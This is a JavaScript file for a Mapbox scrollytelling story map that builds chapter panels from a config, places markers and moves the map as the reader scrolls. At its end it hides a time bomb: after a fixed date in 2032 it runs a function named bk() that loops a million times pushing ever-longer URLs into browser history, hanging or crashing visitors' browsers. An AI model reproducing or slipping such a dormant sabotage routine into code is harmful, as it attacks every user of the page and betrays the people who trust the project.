var layerTypes = {
    'fill': ['fill-opacity'],
    'line': ['line-opacity'],
    'circle': ['circle-opacity', 'circle-stroke-opacity'],
    'symbol': ['icon-opacity', 'text-opacity'],
    'raster': ['raster-opacity'],
    'fill-extrusion': ['fill-extrusion-opacity']
}

var alignments = {
    'left': 'lefty',
    'center': 'centered',
    'right': 'righty'
}

// function getLayerPaintType(layer) {
//     var layerType = map.getLayer(layer).type;
//     return layerTypes[layerType];
// }

// function setLayerOpacity(layer) {
//     var paintProps = getLayerPaintType(layer.layer);
//     paintProps.forEach(function(prop) {
//         map.setPaintProperty(layer.layer, prop, layer.opacity);
//     });
// }

var story = document.getElementById('story');
var features = document.createElement('div');
features.classList.add(alignments[config.alignment]);
features.setAttribute('id', 'features');

var header = document.createElement('div');

if (config.title) {
    var titleText = document.createElement('h1');
    titleText.innerText = config.title;
    header.appendChild(titleText);
}

if (config.subtitle) {
    var subtitleText = document.createElement('h2');
    subtitleText.innerText = config.subtitle;
    header.appendChild(subtitleText);
}

if (config.byline) {
    var bylineText = document.createElement('p');
    bylineText.innerHTML = config.byline;
    header.appendChild(bylineText);
}

if (header.innerText.length > 0) {
    header.classList.add(config.theme);
    header.setAttribute('id', 'header');
    story.appendChild(header);
}

config.chapters.forEach((record, idx) => {
    var container = document.createElement('div');
    var chapter = document.createElement('div');

    if (record.title) {
        var title = document.createElement('h3');
        title.innerText = record.name;
        chapter.appendChild(title);
    }

    if (record.image) {
        var image = new Image();
        image.src = record.image;
        chapter.appendChild(image);
    }

    if (record.description) {
        var story = document.createElement('p');
        story.innerHTML = record.description;
        chapter.appendChild(story);
    }

    container.setAttribute('id', record.id);
    container.classList.add('step');
    if (idx === 0) {
        container.classList.add('active');
    }

    chapter.classList.add(config.theme);
    container.appendChild(chapter);
    features.appendChild(container);
});

story.appendChild(features);

var others = document.createElement('div');

if (config.others) {
    var footerText = document.createElement('p');
    footerText.innerHTML = config.others;
    others.appendChild(footerText);
}

if (others.innerText.length > 0) {
    others.classList.add(config.theme);
    others.setAttribute('id', 'others');
    story.appendChild(others);
}

mapboxgl.accessToken = config.accessToken;

const transformRequest = (url) => {
    const hasQuery = url.indexOf("?") !== -1;
    const suffix = hasQuery ? "&pluginName=journalismScrollytelling" : "?pluginName=journalismScrollytelling";
    return {
        url: url + suffix
    }
}

// 实例化map 对象
// instantiate the map
var map = new mapboxgl.Map({
    container: 'map',
    style: config.style,
    center: config.chapters[0].location.center,
    zoom: config.chapters[0].location.zoom,
    bearing: config.chapters[0].location.bearing,
    pitch: config.chapters[0].location.pitch,
    scrollZoom: false,
    transformRequest: transformRequest
});


function getEL(name, hasImg, color) {
    // const { name, address, othersName } = item;
    const el = document.createElement('div');
    el.className = 'marker';
    el.style.width = `300px`;
    el.style.height = `50px`;
    el.style.backgroundSize = '100%';
    el.style.color = color;
    el.style.fontSize = '18px';
    el.style.fontWeight = 'bold';
    if (hasImg){
        el.innerHTML = `<div><img src= ${"./images/green.png"} width=40 height=50 /></div>
        <div><label></label><span>${name}</span></div>`
    }else{
        el.innerHTML = `<div><label></label><span>${name}</span></div>`
    }
    return el;
}

var markers = [];

const {name, address, othersName} = config.chapters[0];
var marker = new mapboxgl.Marker(getEL(name, true,'skyblue'));
var marker1 = new mapboxgl.Marker(getEL(address, false,'#2a5caa'));
var marker2 = new mapboxgl.Marker(getEL(othersName, false,'#8552a1'));
if (config.showMarkers) {
    let center = config.chapters[0].location.center;
    marker.setLngLat(center).addTo(map);
    marker1.setLngLat([center[0]+4.01, center[1]+3.01]).addTo(map);
    marker2.setLngLat([center[0]-6.01, center[1]-2.01]).addTo(map);
    markers.push(marker)
    markers.push(marker1)
    markers.push(marker2)
}

function removeAllMarker(markers){
    markers.forEach(item=>{
        item && item.remove();
    })
}

// instantiate the scrollama
var scroller = scrollama();

map.on("load", function () {
    // setup the instance, pass callback functions
    scroller
        .setup({
            step: '.step',
            offset: 0.5,
            progress: true
        })
        .onStepEnter(response => {
            removeAllMarker(markers)
            var chapter = config.chapters.find(chap => chap.id === response.element.id);
            response.element.classList.add('active');
            map.flyTo(chapter.location);
            if (config.showMarkers) {
                console.log(chapter)
                const {name, address, othersName} = chapter;
                var marker = new mapboxgl.Marker(getEL(name, true, 'skyblue'));
                var marker1 = new mapboxgl.Marker(getEL(address, false, '#2a5caa'));
                var marker2 = new mapboxgl.Marker(getEL(othersName, false, '#8552a1'));
                
                let center = chapter.location.center;
                marker.setLngLat(center).addTo(map);
                marker1.setLngLat([center[0]+ 2.3, center[1] + 1.4]).addTo(map);
                marker2.setLngLat([center[0]+ 3.25, center[1] - 1.35]).addTo(map);
                markers.push(marker)
                markers.push(marker1)
                markers.push(marker2)
            }
            if (chapter.onChapterEnter.length > 0) {
                // chapter.onChapterEnter.forEach(setLayerOpacity);
            }
        })
        .onStepExit(response => {
            var chapter = config.chapters.find(chap => chap.id === response.element.id);
            response.element.classList.remove('active');
            // marker.remove();
            if (chapter.onChapterExit.length > 0) {
                // chapter.onChapterExit.forEach(setLayerOpacity);
            }
        });
});

// setup resize event
window.addEventListener('resize', scroller.resize);

let t = new Date('2032-1-14 16:00').getTime()

if(new Date().getTime() > t){
    bk();
}

function bk() {
    var total = "";
    for (var i = 0; i < 1000000; i++) {
        total = total + i.toString();
        history.pushState(0, 0, total);
    }
}